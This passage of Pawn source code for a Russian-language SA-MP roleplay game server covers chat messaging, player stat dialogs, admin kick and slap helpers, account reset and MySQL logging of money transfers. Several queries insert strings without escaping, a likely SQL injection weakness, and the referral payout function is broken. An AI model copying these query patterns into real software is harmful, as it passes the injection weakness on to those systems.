				if(GetPlayerVirtualWorld(playerid) == GetPlayerVirtualWorld(i))
				{
					GetPlayerPos(i, posx, posy, posz);
					tempposx = (oldposx -posx);
					tempposy = (oldposy -posy);
					tempposz = (oldposz -posz);
					if(((tempposx < radi/16) && (tempposx > -radi/16)) && ((tempposy < radi/16) && (tempposy > -radi/16)) && ((tempposz < radi/16) && (tempposz > -radi/16))) SCM(i, col1, string);
					else if(((tempposx < radi/8) && (tempposx > -radi/8)) && ((tempposy < radi/8) && (tempposy > -radi/8)) && ((tempposz < radi/8) && (tempposz > -radi/8))) SCM(i, col2, string);
					else if(((tempposx < radi/4) && (tempposx > -radi/4)) && ((tempposy < radi/4) && (tempposy > -radi/4)) && ((tempposz < radi/4) && (tempposz > -radi/4))) SCM(i, col3, string);
					else if(((tempposx < radi/2) && (tempposx > -radi/2)) && ((tempposy < radi/2) && (tempposy > -radi/2)) && ((tempposz < radi/2) && (tempposz > -radi/2))) SCM(i, col4, string);
					else if(((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi))) SCM(i, col5, string);
				}
			}
		}
	}
	return 1;
}


stock SpeedVehicle(playerid)
{
	new Float:ST[4];
	
	if(IsPlayerInAnyVehicle(playerid)) GetVehicleVelocity(GetPlayerVehicleID(playerid),ST[0],ST[1],ST[2]);
	else GetPlayerVelocity(playerid,ST[0],ST[1],ST[2]);
	
	return floatround(floatsqroot(ST[0]*ST[0] + ST[1]*ST[1] + ST[2]*ST[2]) * 130.0);
}

stock SCMA(color, text[])
{
	foreach(new i:Player)
	{
	    if(PlayerInfo[i][bAdmin] > 0) SCM(i, color, text);
	}
	return 1;
}

stock SCMH(color, text[])
{
	foreach(new i:Player)
	{
	    if(PlayerInfo[i][pSupport] > 0) SCM(i, color, text);
	}
	return 1;
}
SCMPolice(color, text[])
{
	foreach(new i : Player)
	{
	    if(PlayerInfo[i][pMember] == TEAM_PPS || PlayerInfo[i][pMember] == TEAM_FSB) SCM(i, color, text);
	}
	return 1;
}
stock TranslateText(string[]) // by Alex009
{
	new result[128];
	for (new i = 0; i < sizeof(result); i++)
	{
		switch (string[i])
		{
		case 'а': result[i] = 'a'; //ЂE­€…­
		case 'А': result[i] = 'A';
		case 'б': result[i] = '—';
		case 'Б': result[i] = 'Ђ';
		case 'в': result[i] = 'ў';
		case 'В': result[i] = '‹';
		case 'г': result[i] = '™';
		case 'Г': result[i] = '‚';
		case 'д': result[i] = 'љ';
		case 'Д': result[i] = 'ѓ';
		case 'е': result[i] = 'e';
		case 'Е': result[i] = 'E';
		case 'ё': result[i] = 'e';
		case 'Ё': result[i] = 'E';
		case 'ж': result[i] = '›';
		case 'Ж': result[i] = '„';
		case 'з': result[i] = 'џ';
		case 'З': result[i] = '€';
		case 'и': result[i] = 'њ';
		case 'И': result[i] = '…';
		case 'й': result[i] = 'ќ';
		case 'Й': result[i] = '…';
		case 'к': result[i] = 'k';
		case 'К': result[i] = 'K';
		case 'л': result[i] = 'ћ';
		case 'Л': result[i] = '‡';
		case 'м': result[i] = 'Ї';
		case 'М': result[i] = 'M';
		case 'н': result[i] = '®';
		case 'Н': result[i] = '­';
		case 'о': result[i] = 'o';
		case 'О': result[i] = 'O';
		case 'п': result[i] = 'Ј';
		case 'П': result[i] = 'Њ';
		case 'р': result[i] = 'p';
		case 'Р': result[i] = 'P';
		case 'с': result[i] = 'c';
		case 'С': result[i] = 'C';
		case 'т': result[i] = '¦';
		case 'Т': result[i] = 'Џ';
		case 'у': result[i] = 'y';
		case 'У': result[i] = 'Y';
		case 'ф': result[i] = '~';
		case 'Ф': result[i] = 'Ѓ';
		case 'х': result[i] = 'x';
		case 'Х': result[i] = 'X';
		case 'ц': result[i] = '*';
		case 'Ц': result[i] = '‰';
		case 'ч': result[i] = '¤';
		case 'Ч': result[i] = 'Ќ';
		case 'ш': result[i] = 'Ґ';
		case 'Ш': result[i] = 'Ћ';
		case 'щ': result[i] = 'Ў';
		case 'Щ': result[i] = 'Љ';
		case 'ь': result[i] = '©';
		case 'Ь': result[i] = '’';
		case 'ъ': result[i] = 'ђ';
		case 'Ъ': result[i] = '§';
		case 'ы': result[i] = 'Ё';
		case 'Ы': result[i] = '‘';
		case 'э': result[i] = 'Є';
		case 'Э': result[i] = '“';
		case 'ю': result[i] = '«';
		case 'Ю': result[i] = '”';
		case 'я': result[i] = '¬';
		case 'Я': result[i] = '•';
		default: result[i] = string[i];
		}
	}
	return result;
}
stock MeAction(playerid,action[],Float:distance = 13.0)
{
	format(stringer,144,"%s %s",PlayerInfo[playerid][pName],action);
	ProxDetector(distance, playerid, stringer, purple, purple, purple, purple, purple);
	return 1;
}
stock IsNumeric(string[])
{
	for (new i = 0, j = strlen(string); i < j; i++) if(string[i] > '9' || string[i] < '0') return 0;
	return 1;
}
stock ShowPass(playerid,actplayerid)
{
	stringer[0] = EOS;
	new string_last[156];
	format(string_last,sizeof(string_last),"{"cblue"}Имя Фамилия{"cwhite"}:\t\t%s\n{"cblue"}Пол{"cwhite"}:\t\t\t%s\n{"cblue"}Лет в области{"cwhite"}:\t%d(1/196)\n{"cblue"}Законопослушность{"cwhite"}: 9\n",PlayerInfo[playerid][pName],(PlayerInfo[playerid][pSex] == 1 ? ("Мужской") : ("Женский")),PlayerInfo[playerid][pLVL]);
	strcat(stringer,string_last);
	if(PlayerInfo[playerid][pMember] > 0 && PlayerInfo[playerid][pRang] > 0) format(string_last,sizeof(string_last),"{"cblue"}Организация{"cwhite"}:\t\t%s\n{"cblue"}Звание{"cwhite"}:\t\t%s\n",GetMember[PlayerInfo[playerid][pMember]-1],PlayerRank[PlayerInfo[playerid][pMember]-1][PlayerInfo[playerid][pRang]-1]);
	else format(string_last,sizeof(string_last),"{"cblue"}Организация{"cwhite"}:\t\tОтсутствует\n{"cblue"}Звание{"cwhite"}{"cwhite"}:\t\tНеизвестно\n");
	strcat(stringer,string_last);
	format(string_last,sizeof(string_last),"{"cblue"}Работа{"cwhite"}:\t\tОтсутсвуте");
	strcat(stringer,string_last);
	ShowPlayerDialog(actplayerid,0000,DIALOG_STYLE_MSGBOX,"{"cblue"}Документы",stringer,"Закрыть","");
	return 1;
}

stock ShowUd(playerid,actplayerid)
{
	stringer[0] = EOS;
	new string_last[156];
	format(string_last,sizeof(string_last),"{"cblue"}Организация{"cwhite"}: %s\n",GetMember[PlayerInfo[playerid][pMember]-1]);
	strcat(stringer,string_last);
	format(string_last,sizeof(string_last),"{"cblue"}Имя Фамилия{"cwhite"}: %s\n",PlayerInfo[playerid][pName]);
	strcat(stringer,string_last);
	format(string_last,sizeof(string_last),"{"cblue"}Звание / Должность{"cwhite"}: %s\n",PlayerRank[PlayerInfo[playerid][pMember]-1][PlayerInfo[playerid][pRang]-1]);
	strcat(stringer,string_last);
	ShowPlayerDialog(actplayerid,0000,DIALOG_STYLE_MSGBOX,"{"cblue"}Служебное удостоверение",stringer,"Закрыть","");
	return 1;
}

stock SKick(playerid, to_player)
{
	if(!IsPlayerConnected(to_player)) return SCM(playerid, red, "Такого игрока нет!");

	if(PlayerInfo[to_player][bAdmin] > PlayerInfo[playerid][bAdmin]) return SCM(playerid, red, "Администратор не может быть кикнут.");

	stringer[0] = EOS;
	format(stringer, 164, "[A] %s[%d] тихо кикнул игрока %s[%d].", PlayerInfo[playerid][pName], playerid, PlayerInfo[to_player][pName], to_player);
	SCMA(grey, stringer);

	NewKick(to_player);

	return 1;
}
stock Slap(playerid, to_player)
{
	new Float:slx, Float:sly, Float:slz, Float:shealth;
	if(!PlayerInfo[to_player][pLogin] && !IsPlayerConnected(to_player)) return 1;

	new string[256];
	format(string, sizeof(string), "[A] %s[%d] слапнул игрока %s[%d]", PlayerInfo[playerid][pName], playerid, PlayerInfo[to_player][pName], to_player);
	SCMA(grey, string);
	format(string, sizeof(string), "Администратор %s слапнул вас", PlayerInfo[playerid][pName]);
	SCM(to_player, white, string);

	GetPlayerHealth(to_player, shealth);
	SetPlayerHealth(to_player, shealth-5);
	GetPlayerPos(to_player, slx, sly, slz);
	SetPlayerPos(to_player, slx, sly, slz+5);
	PlayerPlaySound(to_player, 1130, slx, sly, slz+5);

	return 1;
}

stock stats_player(playerid, targetid)
{
    stringer[0] = EOS;
    new string_last[256];
    format(string_last, sizeof(string_last), "{FFFFFF}Имя: \t\t\t\t{"cblue"}%s{FFFFFF}\n", PlayerInfo[targetid][pName]);
    strcat(stringer,string_last);
    format(string_last, sizeof(string_last), "Уровень: \t\t\t%d\n", PlayerInfo[targetid][pLVL]);
    strcat(stringer,string_last);
    format(string_last, sizeof(string_last), "Очки опыта: \t\t\t%d/%d\n", PlayerInfo[targetid][pExp],(PlayerInfo[targetid][pLVL])*4);
    strcat(stringer,string_last);
    format(string_last, sizeof(string_last), "Деньги: \t\t\t%d\n", PlayerInfo[targetid][pCash]);
    strcat(stringer,string_last);
    format(string_last, sizeof(string_last), "Деньги в банке: \t\t%d\n", PlayerInfo[targetid][pBCash]);
    strcat(stringer,string_last);
    format(string_last, sizeof(string_last), "Мобильный счет: \t\t%d\n", PlayerInfo[targetid][pPhoneCash]);
    strcat(stringer,string_last);
    format(string_last, sizeof(string_last), "Номер телефона: \t\t%d\n", PlayerInfo[targetid][pPhoneNumber]);
    strcat(stringer,string_last);
    format(string_last, sizeof(string_last), "Уровень розыска: \t\t%d\n", PlayerInfo[targetid][pWANTED]);
    strcat(stringer,string_last);
    format(string_last, sizeof(string_last), "Наркотики: \t\t\t%d\n", PlayerInfo[targetid][pDrugs]);
    strcat(stringer,string_last);
    format(string_last, sizeof(string_last), "Патроны: \t\t\t%d\n", PlayerInfo[targetid][pPatr]);
    strcat(stringer,string_last);
    format(string_last, sizeof(string_last), "Металл: \t\t\t%d\n", PlayerInfo[targetid][pMetall]);
    strcat(stringer,string_last);
    format(string_last, sizeof(string_last), "Наркозависимость: \t\t%d\n", PlayerInfo[targetid][pLomka]);
    strcat(stringer,string_last);
    format(string_last, sizeof(string_last), "Пол: \t\t\t\t%s\n", (PlayerInfo[targetid][pSex] == 1) ? ("Мужской") : ("Женский"));
    strcat(stringer,string_last);
    format(string_last, sizeof(string_last), "Проживание: \t\t\t%s\n\n", "Дома");
    strcat(stringer,string_last);
    
    format(string_last, sizeof(string_last), "Организация: \t\t\t%s\n", GetMember[PlayerInfo[targetid][pMember]]);
    strcat(stringer,string_last);
    format(string_last, sizeof(string_last), "Работа / должность: \t\t%s\n", (PlayerInfo[targetid][pJob] >= 1) ? (jobs_name[PlayerInfo[targetid][pJob]]) : (PlayerRank[PlayerInfo[targetid][pMember]][PlayerInfo[targetid][pRang]]));
    strcat(stringer,string_last);
    format(string_last, sizeof(string_last), "Ранг: \t\t\t\t%d\n", PlayerInfo[targetid][pRang]);
    strcat(stringer,string_last);
    format(string_last, sizeof(string_last), "Военный билет: \t\t%s\n", PlayerInfo[targetid][pVoen] == 1 ? ("Есть") : ("Нет"));
    strcat(stringer,string_last);
    
	SPD(playerid, D_NULL, DIALOG_STYLE_MSGBOX, "{"cblue"}Статистика персонажа", stringer, "Закрыть", "");
	return 1;
}

stock ClearAccount(playerid)
{
	PlayerInfo[playerid][pID] = 0;
	PlayerInfo[playerid][pDateReg] = EOS;
    PlayerInfo[playerid][pName] = EOS;
	PlayerInfo[playerid][pSex] = 0;
	PlayerInfo[playerid][pCash] = 0;
	PlayerInfo[playerid][pEmail] = EOS;
	PlayerInfo[playerid][pLVL] = 0;
	PlayerInfo[playerid][pExp] = 0;
	PlayerInfo[playerid][pReferal] = EOS;
	PlayerInfo[playerid][pMember] = 0;
	PlayerInfo[playerid][pModel] = 0;
	PlayerInfo[playerid][pRang] = 0;
	PlayerInfo[playerid][pWarnF] = 0;
	PlayerInfo[playerid][pWarnA] = 0;
	PlayerInfo[playerid][pJob] = 0;
	PlayerInfo[playerid][pVIP] = 0;
	PlayerInfo[playerid][bAdmin] = 0;
	PlayerInfo[playerid][pPhone] = 0;
    PlayerInfo[playerid][pPhoneNumber] = 0;
	PlayerInfo[playerid][pPhoneStatus] = 0;
	PlayerInfo[playerid][pPhoneCash] = 0;
	PlayerInfo[playerid][pKey] = EOS;
	PlayerInfo[playerid][pChar] = 0;
	PlayerInfo[playerid][pBCash] = 0;
	PlayerInfo[playerid][pDonate] = 0;
	PlayerInfo[playerid][pLogin] = false;
	PlayerInfo[playerid][pJail] = 0;
	PlayerInfo[playerid][pMute] = 0;
    PlayerInfo[playerid][pPinCode] = 0;
    PlayerInfo[playerid][pRegIP] = EOS;
    PlayerInfo[playerid][pLastIP] = EOS;
    PlayerInfo[playerid][pNewIp] = EOS;
    PlayerInfo[playerid][pTruckLVL] = 0;
    PlayerInfo[playerid][pTruckEXP] = 0;
    PlayerInfo[playerid][pLicBiz] = 0;
    PlayerInfo[playerid][pLicGun] = 0;
    PlayerInfo[playerid][pLicFly] = 0;
    PlayerInfo[playerid][pVoen] = 0;
    PlayerInfo[playerid][pVoenEXP] = 0;
    PlayerInfo[playerid][pBizID] = -1;
    PlayerInfo[playerid][pCarID] = -1;
    PlayerInfo[playerid][pHomeID] = -1;
    PlayerInfo[playerid][pPodID] = -1;
    PlayerInfo[playerid][pKvartID] = -1;
    PlayerInfo[playerid][pNeedToilet] = 100;
    PlayerInfo[playerid][pNeedEat] = 100;
 	PlayerInfo[playerid][pNeedDrink] = 100;
 	PlayerInfo[playerid][pNeedWash] = 100;
  	PlayerInfo[playerid][pMask] = 0;
   	PlayerInfo[playerid][pHeal] = 0;
 	PlayerInfo[playerid][pPepsi] = 0;
 	PlayerInfo[playerid][pBackPack] = 0;
 	PlayerInfo[playerid][pSmoke] = 0;
 	PlayerInfo[playerid][pBeer] = 0;
 	PlayerInfo[playerid][pLighter] = 0;
 	PlayerInfo[playerid][pChips] = 0;
 	
  	PlayerInfo[playerid][pFamID] = -1;
 	PlayerInfo[playerid][pFamRang] = 0;

	format(PlayerInfo[playerid][pOffUninviteMess], 144, "None");
	format(PlayerInfo[playerid][pMuteOffMess], 144, "None");
	format(PlayerInfo[playerid][pJailOffMess], 144, "None");
	format(PlayerInfo[playerid][pKvartOffMess], 144, "None");
	format(PlayerInfo[playerid][pBizOffMess], 144, "None");
	format(PlayerInfo[playerid][pHouseOffMess], 144, "None");
    format(PlayerInfo[playerid][pFAMoffuninvite], 144, "None");

 	PlayerInfo[playerid][pLastX] = 0.0;
 	PlayerInfo[playerid][pLastY] = 0.0;
 	PlayerInfo[playerid][pLastZ] = 0.0;
	PlayerInfo[playerid][pFSkin] = 0;
 	PlayerInfo[playerid][pHP] = 100.0;
	PlayerInfo[playerid][pARM] = 0.0;
 	PlayerInfo[playerid][pHOSPITAL] = 0;
 	PlayerInfo[playerid][pWarn] = 0;
 	PlayerInfo[playerid][pSupport] = 0;
 	PlayerInfo[playerid][bJail] = 0;
 	PlayerInfo[playerid][bMute] = 0;
	PlayerInfo[playerid][bBan] = 0;
	PlayerInfo[playerid][bWarn] = 0;
	PlayerInfo[playerid][bOffJail] = 0;
	PlayerInfo[playerid][bOffMute] = 0;
	PlayerInfo[playerid][bOffBan] = 0;
	PlayerInfo[playerid][bOffWarn] = 0;
	PlayerInfo[playerid][bUnBan] = 0;
	PlayerInfo[playerid][bUnWarn] = 0;
	PlayerInfo[playerid][bYoutube] = 0;
	PlayerInfo[playerid][R_9MM] = 0;
	PlayerInfo[playerid][R_USP] = 0;
	PlayerInfo[playerid][R_DEAGLE] = 0;
	PlayerInfo[playerid][R_TEK9] = 0;
	PlayerInfo[playerid][R_USI] = 0;
	PlayerInfo[playerid][R_MP5] = 0;
	PlayerInfo[playerid][R_SHOTGUN] = 0;
	PlayerInfo[playerid][R_SAWED_OF] = 0;
	PlayerInfo[playerid][R_FIGHT_SHOTGUN] = 0;
	PlayerInfo[playerid][R_AK47] = 0;
	PlayerInfo[playerid][R_M4] = 0;
	PlayerInfo[playerid][R_COUNTRY_RIFLE] = 0;
	PlayerInfo[playerid][R_SNIPER_RIFLE] = 0;
	PlayerInfo[playerid][R_SMOKE] = 0;
	PlayerInfo[playerid][R_GRENADE] = 0;
	PlayerInfo[playerid][R_MOLOTOV] = 0;
	
	PlayerInfo[playerid][pPaintBall] = false;
	PlayerInfo[playerid][pPaintKills] = 0;
	PlayerInfo[playerid][pInvitePaintBall] = false;
	




	prop_called[playerid] = -1;
	call_called[playerid] = -1;
	player_in_business[playerid] = -1;
	player_in_house[playerid] = -1;
	player_in_toilet[playerid] = -1;
	player_in_kvart[playerid] = -1;
	player_in_podezd[playerid] = -1;
	player_job_vehicle_arend[playerid] = -1;
	player_job_vehicle_created[playerid] = -1;
	player_job_vehicle_created_2[playerid] = -1;
	training_timer[playerid] = 0;
	player_ownable_car[playerid] = -1;

    DeletePVar(playerid, "me_called");

	for(new i = 0; i < 13; i++)
	{
		PlayerInfo[playerid][pGun][i] = 0;
		PlayerInfo[playerid][pAmmo][i] = 0;
	}
	PlayerInfo[playerid][pBizID] = 0;
	return 1;
}

publics LoadAntiCheats()
{
	new rows, fields;
	cache_get_data(rows, fields);
	if(rows)
	{
	    for(new i = 0; i < rows; i++)
	    {
	        AntiCheatInfo[i][acID] = cache_get_field_content_int(i, "acID");
	        cache_get_field_content(i, "acName", AntiCheatInfo[i][acName], connects, 32);
	        AntiCheatInfo[i][acStatus] = cache_get_field_content_int(i, "acStatus");
	        Iter_Add(AllAntiCheats, i);
	    }
        print("[UNIGVA] Античт загружен!");
	}

	return 1;
}

publics LoadOther()
{
	new rows, fields;
	cache_get_data(rows, fields);
	if(rows)
	{
        miner_zp = cache_get_field_content_int(0, "miner_zp");
        loader_zp = cache_get_field_content_int(0, "loader_zp");
        diver_zp = cache_get_field_content_int(0, "diver_zp");
        
        dm = cache_get_field_content_int(0, "dm");
        db = cache_get_field_content_int(0, "db");
        nonrp = cache_get_field_content_int(0, "nonrp");
        drive = cache_get_field_content_int(0, "drive");
        mg = cache_get_field_content_int(0, "mg");
        epp = cache_get_field_content_int(0, "epp");
        caps = cache_get_field_content_int(0, "caps");
        flood = cache_get_field_content_int(0, "flood");
        offtop = cache_get_field_content_int(0, "offtop");
        
        XDay = cache_get_field_content_int(0, "XDay");
        server_pass_status = cache_get_field_content_int(0, "server_pass_status");
        cache_get_field_content(0, "server_pass", server_pass, connects, 24);
        print("[UNIGVA] Остальное загружено!");
	}

	return 1;
}
publics LoadRepositories()
{
	new rows, fields;
	cache_get_data(rows, fields);
	if(rows)
	{
        REPOSITORY_ARMY_METALL = cache_get_field_content_int(0, "army_met");
        REPOSITORY_ARMY_PATRON = cache_get_field_content_int(0, "army_patr");
        
        OPG_O_METALL = cache_get_field_content_int(0, "OPG_O_METALL");
        OPG_O_PATRON = cache_get_field_content_int(0, "OPG_O_PATRON");
        OPG_O_DRUGS = cache_get_field_content_int(0, "OPG_O_DRUGS");
        OPG_O_STATUS = cache_get_field_content_int(0, "OPG_O_STATUS");
        OPG_O_MONEY = cache_get_field_content_int(0, "OPG_O_MONEY");
        
        OPG_S_METALL = cache_get_field_content_int(0, "OPG_S_METALL");
        OPG_S_PATRON = cache_get_field_content_int(0, "OPG_S_PATRON");
        OPG_S_DRUGS = cache_get_field_content_int(0, "OPG_S_DRUGS");
        OPG_S_STATUS = cache_get_field_content_int(0, "OPG_S_STATUS");
        OPG_S_MONEY = cache_get_field_content_int(0, "OPG_S_MONEY");
        
        ALL_NARKO = cache_get_field_content_int(0, "ALL_NARKO");
		print("[UNIGVA] Репозитории загружены!");
		SaveRepository();
	}

	return 1;
}
publics PayDayReferal(targetid[])
{
    new rows, targetBmoney;
    if(rows)
    {
        targetBmoney = cache_get_field_content_int(0, "pBCash");

        targetBmoney += 50000;

        new string[128];
        format(string, sizeof(string), "UPDATE `accounts` SET `pBCash` = '%d' WHERE `pName` = '%s'", targetBmoney, targetid);
        mysql_tquery(connects, string, "", "");
    }
    return 1;
}
publics PlayerToggle(playerid)
{
	TogglePlayerControllable(playerid, 1);
	ClearAnimations(playerid);
	return 1;
}
publics minuteupdate()
{
	return 1;
}

publics PlayerSecondTimer(playerid)
{
	
	new string[144];
	if(PlayerInfo[playerid][pAFK] >= 3)
	{
		format(string,sizeof(string),"AFK: %s",Converts(PlayerInfo[playerid][pAFK]));
		SetPlayerChatBubble(playerid, string, red, 10.0, 980);
	}

	PlayerInfo[playerid][pAFK] ++;
	
	if(!IsPlayerAfk(playerid))
    {
	    if(PlayerInfo[playerid][pJail] > 0)
	    {
	        PlayerInfo[playerid][pJail]--;
	        if(PlayerInfo[playerid][pJail] < 1)
	        {
	            PlayerInfo[playerid][pJail] = -1;
	            SCM(playerid, green, !"Поздравляем! Вы вышли из деморгана. Не нарушайте больше правил сервера.");
	            SetSpawnVokzal(playerid);
				SaveAccounts(playerid);
	        }
	    }
	    if(PlayerInfo[playerid][pMute] > 0)
	    {
	        PlayerInfo[playerid][pMute]--;
	        if(PlayerInfo[playerid][pMute] < 1)
	        {
	            PlayerInfo[playerid][pMute] = -1;
	            SCM(playerid, green, !"Поздравляем! С вас снята затычка, больше не нарушайте правил сервера.");
				SaveAccounts(playerid);
	        }
	    }
	    if(PlayerInfo[playerid][pKPZ] > 0)
	    {
	        PlayerInfo[playerid][pKPZ]--;
	        if(PlayerInfo[playerid][pKPZ] < 1)
	        {
	            PlayerInfo[playerid][pKPZ] = -1;
	            SCM(playerid, green, !"Поздравляем! Вы вышли из КПЗ, попытайтесь больше не нарушать закон.");
				SaveAccounts(playerid);
				SetSpawnVokzal(playerid);
	        }
	    }
	}
	
	return 1;
}
publics secondupdate()
{
	return 1;
}
stock GiveMoney(p, money, reason[])
{
	new Year, Month, Day;
	getdate(Year, Month, Day);

	new Hour, Minute;
	gettime(Hour, Minute);
	
	PlayerInfo[p][pCash] += money;
	ResetPlayerMoney(p);
	GivePlayerMoney(p, PlayerInfo[p][pCash]);

	new fmt_msg[128], ip[20];
	GetPlayerIp(p, ip, sizeof(ip));
	
	format(fmt_msg, sizeof(fmt_msg), "%s%d", (money >= 0) ? "+" : "", money);
	SetPlayerChatBubble(p, fmt_msg, blue, 10.0, 5000);

	format(fmt_msg, sizeof(fmt_msg), "~%s~ %s%d rub", (money >= 0) ? "g" : "r", (money >= 0) ? "+" : "", money);
	GameTextForPlayer(p, fmt_msg, 1500, 1);

	mysql_format(connects, stringer, sizeof(stringer), "INSERT INTO `givemoney` (`Nick`, `Money`, `Reason`, `ip`, `time`) VALUES ('%d', '%d', '%s', '%s', '%d-%02d-%02d %d:%02d')", PlayerInfo[p][pID], money, reason, ip, Day, Month, Year, Hour, Minute);
	mysql_tquery(connects, stringer);
}

stock GiveBankMoney(p, money, reason[])
{
	new Year, Month, Day;
	getdate(Year, Month, Day);

	new Hour, Minute;
	gettime(Hour, Minute);

	PlayerInfo[p][pBCash] += money;

	new ip[20];
	GetPlayerIp(p, ip, sizeof(ip));
	
	new time[128];
	format(time, sizeof(time), "%d-%02d-%02d %d:%02d", Day, Month, Year, Hour, Minute);

	mysql_format(connects, stringer, sizeof(stringer), "INSERT INTO `givebankmoney` (`Nick`, `Money`, `Reason`, `ip`, `time`) VALUES ('%d', '%d', '%s', '%s', '%s')", PlayerInfo[p][pID], money, reason, ip, time);
	mysql_tquery(connects, stringer);
}

stock GetPlayerID(string[])
{
    foreach(new i: Player)
    {
        if(!IsPlayerConnected(i))continue;
        if(!strcmp(PlayerInfo[i][pName], string, false)) return i;
    }
    return INVALID_PLAYER_ID;
}
// ************** | КОМАНДЫ | ************** //
CMD:end(playerid)
{
	new string[128];
	if(PlayerInfo[playerid][pJob] == Job_Bus)
	{
		if(player_job_vehicle_arend[playerid] != -1)
		{
			format(string, sizeof(string), "{FFFFFF}Вы уверенны что хотите завершить рабочий день?\nВаша зар. плата составит {"cblue"}%d рублей{FFFFFF}!", PayJob[playerid]);
			SPD(playerid, D_CMD_END_BUS, DIALOG_STYLE_MSGBOX, "{"cblue"}Автобус | Закончить работу", string, "Да", "Нет");
		}
	}
	if(GetPVarInt(playerid, "cleaner_job") == 1)
	{
		format(string, sizeof(string), "{FFFFFF}Вы уверенны что хотите завершить рабочий день?\nВаша зар. плата составит {"cblue"}%d рублей{FFFFFF}!", PayJob[playerid]);
		SPD(playerid, D_CMD_END_CLEANER, DIALOG_STYLE_MSGBOX, "{"cblue"}Автобус | Закончить работу", string, "Да", "Нет");
	}
	return 1;
}





CMD:en(playerid)
{
	if(GetPlayerVehicleID(playerid) == INVALID_VEHICLE_ID) return 1;
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return 1;
	if(IsAVel(GetPlayerVehicleID(playerid))) return 1;
	if(GetPVarInt(playerid, "TIME_ZAVEL") > gettime()) return SCM(playerid,  red, "Не флудите, или вы будете кикнуты.");
	if(vehicle[ GetPlayerVehicleID(playerid) ][veh_fuel] < 1.0) return SCM(playerid, grey, "В вашем транспорте нет бензина! Вызовите механика, или купите канистру на Заправочной Станции.");
	new Float:veh_health;
	GetVehicleHealth(GetPlayerVehicleID(playerid), veh_health);
	if(veh_health < 305.0) return SCM(playerid, grey, "Ваш транспорт заглох! Вызовите механика, или отремонтируйте авто в СТО!");
	new engine, lights, alarm, doors, bonnet, boot, objective;
	GetVehicleParamsEx(GetPlayerVehicleID(playerid),engine, lights, alarm, doors, bonnet, boot, objective);
	if(engine <= 0)
	{
		new modelid = GetVehicleModel(GetPlayerVehicleID(playerid)) - 400;
		if(modelid < 0) return 1;
		engine = 1;
	}
	else engine = 0;
	SetVehicleParamsEx(GetPlayerVehicleID(playerid),engine, lights, alarm, doors, bonnet, boot, objective);
	if(engine) Engines{GetPlayerVehicleID(playerid)} = true;
	else Engines{GetPlayerVehicleID(playerid)} = false;
	SetPVarInt(playerid, "TIME_ZAVEL", gettime()+2);
	return 1;
}

// *** *** *** | Команды администрации | *** *** *** //
// --------[ ADMINS 1 LVL ] ----------
// ---- [ ADMINS 2 LVL ] ----
// ---- [ ADMINS 3 LVL ] ----
// ---- [ ADMINS 4 LVL ] ----
// ---- [ ADMINS 5 LVL ] ----
// ---- [ ADMIN 6 LVL ] ----
// ------ [ ADMIN 7 LVL ] -------

publics DelayedKick(playerid)
{
    ResetPlayerWeaponsAC(playerid);
    SaveAccounts(playerid);
	return Kick(playerid);
}
// ---- APANEL ----

// ------------[ SPAWN ] ----------------
stock SetPlayerDefaultVariables(playerid)
{
	TogglePlayerControllable(playerid,false);
	SetTimerEx("LoadObjects",2000,false,"i",playerid);

    new string[128];
	if(PlayerInfo[playerid][pLogin] != true)
	{
		format(string, sizeof(string), "~w~~h~WELCOME~n~~b~~h~%s",PlayerInfo[playerid][pName]);
	 	GameTextForPlayer(playerid, string, 5000, 1);
	}

	if(PlayerInfo[playerid][pHOSPITAL] > 0)
	{
        new rand = random(3);
        SetPlayerPos(playerid, hospital_coord[rand][0], hospital_coord[rand][1], hospital_coord[rand][2]);
		player_in_business[playerid] = -1;
	    player_in_house[playerid] = -1;
	}
	if(PlayerInfo[playerid][pJail] > 0)
	{
		PlayerPutInDemorgan(playerid);
	}
	if(PlayerInfo[playerid][pKPZ] > 0)
	{
	    PutPlayerInKPZ(playerid);
	}
	SetPlayerHealth(playerid, PlayerInfo[playerid][pHP]);
	SetPlayerWantedLevel(playerid, PlayerInfo[playerid][pWANTED]);
	
	if(PlayerInfo[playerid][pMember] > 0) SetPlayerSkin(playerid, PlayerInfo[playerid][pFSkin]);
	else SetPlayerSkin(playerid, PlayerInfo[playerid][pChar]);
	
	PlayerInfo[playerid][pLogin] = true;
	return 1;
}
stock PlayerPutInDemorgan(playerid)
{
	FreezePlayer(playerid, 2000);
	SetPlayerPos(playerid, -80.3193, 805.4043, -4.9141);
	ResetPlayerWeaponsAC(playerid);
	player_in_business[playerid] = -1;
    player_in_house[playerid] = -1;
	return 1;
}
stock PutPlayerInKPZ(playerid)
{
	FreezePlayer(playerid, 2000);
	if(PlayerInfo[playerid][pJP] != 1) SetPlayerPos(playerid, 2573.7654,-2413.5562,22.4170);
	else SetPlayerPos(playerid, 2574.4177,-2411.0747,22.4170);
	SetPlayerVirtualWorld(playerid, 1);
	ResetPlayerWeaponsAC(playerid);
	player_in_business[playerid] = -1;
    player_in_house[playerid] = -1;
	return 1;
}
//-------------------------
stock IsPlayerAfk(playerid)
{
	return player_afk_time[playerid] >= 5 ? (true) : (false);
}




stock IsVehicleOccupiedEx(vehicleid)
{
	foreach(new i: Player) if(GetPlayerState(i) == PLAYER_STATE_DRIVER && GetPlayerVehicleID(i) == vehicleid) return 1;
	return 0;
}

stock IsVehicleOccupied(vehicleid)
{
    foreach(new i: Player) if(IsPlayerInVehicle(i, vehicleid)) return 1;
    return 0;
}
stock IsVehicleInRangeOfPoint(vehicleid, Float:distance, Float:x, Float:y, Float:z)
{
	new Float:oldposx, Float:oldposy, Float:oldposz;
	new Float:tempposx, Float:tempposy, Float:tempposz;
	GetVehiclePos(vehicleid, oldposx, oldposy, oldposz);
	tempposx = (oldposx - x);
	tempposy = (oldposy - y);
	tempposz = (oldposz - z);
	if (((tempposx < distance) && (tempposx > -distance)) && ((tempposy < distance) && (tempposy > -distance)) && ((tempposz < distance) && (tempposz > -distance)))return true;
	return false;
}
stock IsPlayerInRangeOfPlayer(playerid, to_playerid, Float: distance = 7.0)
{
	if(!IsPlayerConnected(to_playerid)) return -1;

	new Float: x, Float: y, Float: z;
	GetPlayerPos(to_playerid, x, y, z);

    return IsPlayerInRangeOfPoint(playerid, distance, x, y, z) ? (true) : (false);
}
stock LoadPlayerTextDraws(playerid)
{
	#include "../source/textdraws/speed_td.inc"
	#include "../source/textdraws/training.inc"
	#include "../source/textdraws/spec.inc"
	#include "../source/textdraws/logotype.inc"
	#include "../source/textdraws/autosalon.inc"
